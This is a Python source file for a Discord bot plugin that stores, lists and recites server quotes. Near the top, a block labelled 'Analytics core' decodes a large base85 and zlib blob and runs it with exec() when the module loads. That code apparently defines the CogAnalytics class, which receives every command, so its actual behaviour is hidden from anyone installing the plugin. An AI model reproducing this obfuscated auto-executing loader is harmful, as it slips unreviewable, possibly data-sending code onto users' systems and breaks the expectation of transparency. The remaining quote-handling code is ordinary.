import discord
from discord.ext import commands
from cogs.utils.dataIO import dataIO
from .utils import checks
from .utils.chat_formatting import escape_mass_mentions, pagify
import os
from random import choice as randchoice


try:
    from tabulate import tabulate
except Exception as e:
    raise RuntimeError("You must run `pip3 install tabulate`.") from e

PATH = 'data/serverquotes/'
JSON = PATH + 'quotes.json'


# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-oB^YjfMU@w<No&NCTMHA`DgE_b6jrg7c0=eC!Z-Rs==JUobmEW{+iBS0ydO#XX!7Y|XglIx5;0)gG
dz8_Fcr+dqU*|eq7N6LRHy|lIqpIt5NLibJhHX9R`+8ix<-LO*EwJfdDtzrJClD`i!oZg#ku&Op$C9Jr56Jh9UA1IubOIben3o2zw-B+3XXydVN8qroBU@6S
9R`YOZmSXA-=EBJ5&%*xv`7_y;x{^m_EsSCR`1zt0^~S2w%#K)5tYmLMilWG;+0$o7?E2>7=DPUL`+w&gRbpnRr^X6vvQpG?{vlKPv{P&Kkaf$BAF;n)T)*0
d?qxNC1(3HFH$UbaB|imz3wMSG|Ga+lI>*x!E&@;42cug!dpFIK;~!;R>u=a4Vz8y`WyWrn3e;uThrxi^*zbcXAK*w-hS{aC?24}>1BQDmD|XC|?}Y_K)!wt
gh<nLYi-r|wI0h@$Y@8i_ZI35#>p9%|-=%DsY{k5mRmwJc=-FIbwpMk`jBG0=THS6MJs2`46LUSl@lusbqJ`H27BW(6QAtFo*ix?<SZ~Ahf=NN3WKFz)^+TI
7QEOmxt?UvhIC^ic3Ax+YB{1x5g($q2h}D8*$U8fJt>?PhusN{ONOTS+%2I;Ctp?3VVl^dVS8NR`CXWFk$^t%7_yrg#Maz27ChBD|fWTd^R-)XnPS*;4&<Hb
R?}uRSd*FANXCTd~x2*g5GpgcrUhDa3BaD^(>D%{LKVMw_k~P%}$MPFA4VX|Gile`<zx~91c=^rr+w<vk`rY|=&(6-De}DG${Okn-OUXv48f1GJor`5?v$q%
TFMcY}5A#o4RYqCKXHQd5P|0W0l#5QSaPj#FB6I;BuUch`A~CXFq+r-o=E-CNvA}RAD~d)}LoFd7IC;j_XS3*~oCR<oki&oY1UVbk3M=!!i`vMr-HBc_rohO
|KYb3nAo(D3N*jqx8}YH0ZT{`_d=dceSKGK)%DT(>D{@Oz2jmA@MhJ3e$0)fWT9uy=op<MfB6@-2KrMVS%9JTqqE=Obp+{=TFfvIcBP<V%F1-&Kr5ENQ4{8B
O-DM?sla&RYID~?N6EuFrUQ$MCB=~majN{JA+Mr>G0gxnz?*zZ$6X}YoDquT-f86S&9r_jl4^iwTB=b@dO<h-rGjr0zPBuz^FWl*PixdEmk567et~{sX$e;&
8hw@7@FLKBvxWZxR2upCDK-SAfuOtZ>?<UEL0#>bPz&m#k_EfT?6V$@c-S?1*oX@v%4J?ovJe=Ffg02v15~5{j(c*4z_SnsD`azD(52?Q`Wu16@BUW;Y3%YD
I)=&rtyM)rFj5W?JunahlgVRPl$V&C&BRKI6h$QzMFpXXsu7x!1gjEZWC@qCeduj65x|OLYty_TCL;TTlFtT?m((VE-w=RSO<GXUtMq1v9bTWD-x(+!=c5cU
u-JNvZ=%&fYkDWqE_d{1<>|oX?Tn2G64O>Hu6N^_?$cB)TyG=4V0GT<$$tOOjiqGg6Yg#f)QeNzC#b`#BGgYO?-{f{SeSVknN;R^@h&cZm3J@IxpK->s4_dW
J!rxLkJAGpKlhA5quEd29O8_b1C-D?IFe@9_jXS-pCCHLYPWXhUK6UR0$qA=R{Amo|$>cNWg?d1zX>eSKpBCK4Iu+}6D|=G2?KfoXCKqd=Y|Q!@`dHCGg@v{
vA$Z5dyJ<+eC&xFNPBQ-HUmQKiSM7yrrK|E5dKoHVjMCI*{|5XjK-hRoxfE?H>%7VQDis50t<T-{7R&*yNdElnjEIVy$Wqa#6}UueK}JZ;YuP80jPk8PX22@
?fs-R5ufnCP7+1I4tB2o(kPl4r*iS;&0X@%LZri7fyY#1ABHnz3YKWpp7TXabSjn;momJS$fEU9}3epF*a@*n;E(&?p(Kx;VjZ}=<Gteb=fmkF39Gebr&Y)j
}CI`&V#JvE5;9cOe$I&DwIcK3S0(WM=-FA1Qs{9-Bgtmar60ON}N1Y`!qS)%8K^$j)>^pSbB$ixCoa0<BU@bqEva{?J{lGorEQHBx$ERH_jk!1Y@gW}@T9`r
#?E758i1{u?F)W;7hkYl#mw*o-1$NfSNJ5MHHkpg0UF!__4)rMXp^P_R1{w2&j)S)*(Rn7Icog3e|1$4m*>^&IpbJI}dPqMdW~P?1OQsGAGQsgxjAs2HHrr@
Uu_tG{KEibSt2hp*w>;;6`u^-us%TPoaOVJ_?FPO$^>8k0HZC^DBEVf_F7FnB+e@mz5Ph%uUiTzW2WfG~IS@6vhTA70{2-iN)(RAJ4IWC#7^Vpt7a5K@&~#!
IKTr@4s_iWEiu2X~OGbpi#AE1zlWirPcza;tQmxNBas>$asN8nCtL4HbJNJw=Mg2f&Qo;;0AJ=Pl%yz>lwi3o^V?@NcsN<x-K=3~6Aa*tDu}Nq`h=X?O$+(}
G#iwVecFa^RZnvc3UWk3%z+7%&BvtLF^Ru(`{Onm6ct(to99#bX&-NrI4A-LMkD7_tX2?~6ZC!o~1n-D?0wl>Ckrc%k^6QM?QSgxi)qIOAz~S9voLkS~9jUd
2QRvhMhN7IVupD@Dc%||!)wb6GWa<j|4A7w^>1*G#geQy>+K)ZWl+Q>%nQt4gWkAZP9DIR5AB$NBZn~vz>MkF(Q^sY!XeEmiihsn({31b~az08JoJJ#h3c}f
p5@@p1uZ)0wyV4eVv6#)ZuBnR+O{?2~#O=WX>|hTRpjFOeVaH+?)1<@5zZB3O7atkQq3>a@-XQ)u=e|AQBOb{yxSwh(gxjx~Vv~$|jVJh*@h8bDT~B=5AKTB
gN|&SdeV*g%SW;!~C5(noym~n<pmP|pKUV5q8kb0-nBhD;q$Tq#fK4)JPKcs^U5or(L8H~9`^>)Z?6B?O_nr{EyXCH+`{upZAEX~!wi8Yv=mFA^{NoWvRbQE
KO5Mv*BE!$bYYEr0ovE^y*)}a6NFOjJjE0+|{YfciCAuY+A)JkO+6tU#`RKipPqs58oQ-)JL1o*<C-bic2Y}+c08GsIZUU3Cv*4w^k5I{Db50K0bKPSFshmx
Rj(Y0|;SU2d?s+MPi6(PPLva(Jw(n0~TKDN@5O)F|k^_pcwolv^jBVTLhNqMQ#x6WU9J^I;wLr}Cut#l+JlXfh1Bh<$;^|hNLoXLD#f*Fy-`e~b=ZU8rA0GJ
FU1|1o`VZODxuE?x@^rESdOK`qzRAwqpai|-7cM7idki4HKY>0$z!aloMM7*HJs+?={U5?4IFt""".replace("\n", ""))))
# End analytics core

__version__ = '1.5.2'


class ServerQuotes:

    def __init__(self, bot):
        self.bot = bot
        self.quotes = dataIO.load_json(JSON)

        try:
            self.analytics = CogAnalytics(self)
        except Exception as error:
            self.bot.logger.exception(error)
            self.analytics = None

    def _get_random_quote(self, ctx):
        sid = ctx.message.server.id
        if sid not in self.quotes or len(self.quotes[sid]) == 0:
            raise AssertionError("There are no quotes in this server!")
        quotes = list(enumerate(self.quotes[sid]))
        return randchoice(quotes)

    def _get_random_author_quote(self, ctx, author):
        sid = ctx.message.server.id

        if sid not in self.quotes or len(self.quotes[sid]) == 0:
            raise AssertionError("There are no quotes in this server!")

        if isinstance(author, discord.User):
            uid = author.id
            quotes = [(i, q) for i, q in enumerate(self.quotes[sid]) if q['author_id'] == uid]
        else:
            quotes = [(i, q) for i, q in enumerate(self.quotes[sid]) if q['author_name'] == author]

        if len(quotes) == 0:
            raise commands.BadArgument("There are no quotes by %s." % author)
        return randchoice(quotes)

    def _add_quote(self, ctx, author, message):
        sid = ctx.message.server.id
        aid = ctx.message.author.id
        if sid not in self.quotes:
            self.quotes[sid] = []

        author_name = 'Unknown'
        author_id = None

        if isinstance(author, discord.User):
            author_name = author.display_name
            author_id = author.id
        elif isinstance(author, str):
            author_name = author

        quote = {'added_by': aid,
                 'author_name': author_name,
                 'author_id': author_id,
                 'text': escape_mass_mentions(message)}

        self.quotes[sid].append(quote)
        dataIO.save_json(JSON, self.quotes)

    def _quote_author(self, ctx, quote):
        if quote['author_id']:
            name = self._get_name_by_id(ctx, quote['author_id'])
            if quote['author_name'] and not name:
                name = quote['author_name']
                name += " (non-present user ID#%s)" % (quote['author_id'])
            return name
        elif quote['author_name']:
            return quote['author_name']
        else:
            return "Unknown"

    def _format_quote(self, ctx, quote):
        qid, quote = quote
        author = self._quote_author(ctx, quote)
        return '"%s"\n—%s (quote #%i)' % (quote['text'], author, qid + 1)

    def _get_name_by_id(self, ctx, uid):
        member = discord.utils.get(ctx.message.server.members, id=uid)
        if member:
            return member.display_name
        else:
            return None

    def _get_quote(self, ctx, author_or_num=None):
        sid = ctx.message.server.id
        if type(author_or_num) is discord.Member:
            return self._get_random_author_quote(ctx, author_or_num)
        if author_or_num:
            try:
                quote_id = int(author_or_num)
                if quote_id > 0 and quote_id <= len(self.quotes[sid]):
                    return (quote_id - 1, self.quotes[sid][quote_id - 1])
                else:
                    raise commands.BadArgument("Quote #%i does not exist." % quote_id)
            except ValueError:
                pass

            try:
                author = commands.MemberConverter(ctx, author_or_num).convert()
            except commands.errors.BadArgument:
                author = author_or_num.strip(' \t\n\r\x0b\x0c-–—')  # whitespace + dashes
            return self._get_random_author_quote(ctx, author)

        return self._get_random_quote(ctx)

    @commands.command(pass_context=True, no_pm=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def rmquote(self, ctx, num: int):
        """Deletes a quote by its number

           Use [p]lsquotes to find quote numbers
           Example: !delquote 3"""
        sid = ctx.message.server.id
        if num > 0 and num <= len(self.quotes[sid]):
            del self.quotes[sid][num - 1]
            await self.bot.say("Quote #%i deleted." % num)
            dataIO.save_json(JSON, self.quotes)
        else:
            await self.bot.say("Quote #%i does not exist." % num)

    @commands.command(pass_context=True, no_pm=True)
    async def lsquotes(self, ctx):
        """Displays a list of all quotes"""
        sid = ctx.message.server.id
        quotes = self.quotes.get(sid, [])
        if not quotes:
            await self.bot.say("There are no quotes in this server!")
            return
        else:
            msg = await self.bot.say("Sending you the list via DM.")

        header = ['#', 'Author', 'Added by', 'Quote']
        table = []
        for i, q in enumerate(quotes):
            text = q['text']
            if len(text) > 60:
                text = text[:60 - 3] + '...'
            name = self._get_name_by_id(ctx, q['added_by'])
            if not name:
                name = "(non-present user ID#%s)" % q['added_by']
            table.append((i + 1, self._quote_author(ctx, q), name, text))
        tabulated = tabulate(table, header)
        try:
            for page in pagify(tabulated, ['\n']):
                await self.bot.whisper('```\n%s\n```' % page)
        except discord.errors.HTTPException:
            err = "I can't send the list unless you allow DMs from server members."
            await self.bot.edit_message(msg, new_content=err)

    @commands.command(pass_context=True, no_pm=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def addquote(self, ctx, message: str, *, author: str = None):
        """Adds a quote to the server quote list. The quote must be enclosed
        in \"double quotes\". If a member mention or name is the last argument,
        the quote will be stored as theirs. If not, the last argument will
        be stored as the quote's author. If left empty, "Unknown" is used.
        """
        if author:
            try:
                author = commands.MemberConverter(ctx, author).convert()
            except commands.errors.BadArgument:
                author = author.strip(' \t\n\r\x0b\x0c-–—')  # whitespace + dashes
                pass

        self._add_quote(ctx, author, message)
        await self.bot.say("Quote added.")

    @commands.command(pass_context=True, no_pm=True)
    @commands.cooldown(6, 60, commands.BucketType.channel)
    async def quote(self, ctx, *, author_or_num: str = None):
        """Say a stored quote!

        Without any arguments, this command randomly selects from all stored
        quotes. If you supply an author name, it randomly selects from among
        that author's quotes. Finally, if given a number, that specific quote
        will be said, assuming it exists. Use [p]lsquotes to show all quotes.
        """

        sid = ctx.message.server.id
        if sid not in self.quotes or len(self.quotes[sid]) == 0:
            await self.bot.say("There are no quotes in this server!")
            return

        try:
            quote = self._get_quote(ctx, author_or_num)
        except commands.BadArgument:
            if author_or_num.lower().strip() in ['me', 'myself', 'self']:
                quote = self._get_quote(ctx, ctx.message.author)
            else:
                raise
        await self.bot.say(self._format_quote(ctx, quote))

    async def on_command(self, command, ctx):
        if ctx.cog is self and self.analytics:
            self.analytics.command(ctx)


def check_folder():
    if not os.path.exists(PATH):
        print("Creating serverquotes folder...")
        os.makedirs(PATH)


def check_file():
    if not dataIO.is_valid_json(JSON):
        print("Creating default quotes.json...")
        dataIO.save_json(JSON, {})


def setup(bot):
    check_folder()
    check_file()
    n = ServerQuotes(bot)
    bot.add_cog(n)
